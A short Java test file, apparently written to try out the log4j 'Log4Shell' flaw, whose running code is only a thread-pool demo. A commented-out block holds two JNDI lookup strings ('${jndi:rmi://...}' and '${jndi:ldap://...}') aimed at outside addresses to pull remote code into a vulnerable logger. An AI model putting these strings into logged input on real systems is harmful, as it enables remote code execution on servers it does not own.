package zl.hack;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Description : 
 * Copyright (c) Feifan
 * Author by ff_wind_zl 创建
 * @version 1.0
 * @date 2021.12.13 11:52
 */
public class AppTest {

    private static final Logger logger = LogManager.getLogger(AppTest.class);

    public static void main(String[] args) throws Exception {
        /*logger.error("${jndi:rmi://192.168.12.8:8088/remote}");
        logger.error("${jndi:ldap://155.94.154.170:1389/m6tcqd}");
        TimeUnit.SECONDS.sleep(5);*/

        ExecutorService executorService = Executors.newFixedThreadPool(5);
        for (int i = 0; i <= 10; i++) {
            executorService.submit(() -> {
                try {
                    TimeUnit.SECONDS.sleep(10);
                    System.out.println("---------+" + Thread.currentThread().getId());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
        }
        executorService.shutdown();
    }
}
